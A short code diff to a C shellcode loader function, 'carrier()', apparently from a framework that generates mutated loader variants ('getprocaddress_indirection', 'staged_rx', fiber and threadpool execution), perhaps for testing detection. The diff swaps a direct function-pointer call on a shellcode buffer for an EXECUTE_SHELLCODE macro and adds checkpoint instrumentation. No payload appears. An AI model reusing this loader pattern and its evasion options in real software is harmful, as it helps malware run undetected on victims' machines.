@@ -4,6 +4,7 @@
  * MUTATIONS: api_wrapper_injection, getprocaddress_indirection, staged_rx, execution_method
  */
 #include "../header/definitions.h"
+#include "sc_checkpoint.h"
 
 int carrier() {
     DWORD result;
@@ -34,12 +35,7 @@ int carrier() {
 
     ARTIFACT_CHECKPOINT("Launching");
     // @MUTATE:execution_method(direct|callback|fiber|threadpool)
-#ifdef ENABLE_INSTRUMENTATION
-    // Instrumented: pass checkpoint fn ptr so shellcode stub can confirm execution
-    ((void(*)(void(*)(const char*)))(dest))(__artifact_checkpoint);
-#else
-    (*(void(*)())(dest))();
-#endif
+    EXECUTE_SHELLCODE(dest);
 
     return 0;
 }
